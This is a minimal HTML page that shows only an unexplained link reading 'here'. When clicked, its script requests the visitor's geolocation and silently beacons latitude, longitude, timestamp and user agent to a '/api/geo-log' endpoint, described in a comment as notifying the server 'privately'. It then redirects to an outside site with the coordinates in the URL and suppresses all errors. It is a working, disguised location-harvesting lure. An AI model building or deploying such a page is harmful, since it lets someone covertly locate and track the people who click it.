<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>anyway</title>
  <style>
    body { margin: 1.5rem; font: 15px/1.5 system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; color: #000; }
    a { color: inherit; text-decoration: underline; }
  </style>
</head>
<body>
  <a id="link" href="#">here</a>
  <script>
    (function () {
      const link = document.getElementById('link');

      if (!navigator.geolocation) {
        link.textContent = 'nah';
        return;
      }

      link.addEventListener('click', function (e) {
        e.preventDefault();

        navigator.geolocation.getCurrentPosition(
          function (pos) {
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            const url = 'https://matchbybirth.com/?lat=' + encodeURIComponent(lat) + '&lon=' + encodeURIComponent(lon);

            // try to notify server privately (best-effort). use sendBeacon when available
            try {
              const payload = { lat, lon, ts: Date.now(), ua: navigator.userAgent };
              const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
              if (navigator.sendBeacon) {
                navigator.sendBeacon('/api/geo-log', blob);
              } else {
                // fallback: keepalive fetch
                fetch('/api/geo-log', {
                  method: 'POST',
                  body: JSON.stringify(payload),
                  headers: { 'Content-Type': 'application/json' },
                  keepalive: true
                }).catch(() => {/* ignore */});
              }
            } catch (err) { /* ignore */ }

            window.location.href = url;
          },
          function () {
            link.textContent = 'nah';
          },
          { enableHighAccuracy: false, maximumAge: 0, timeout: 30000 }
        );
      }, { once: true });
    })();
  </script>
</body>
</html>
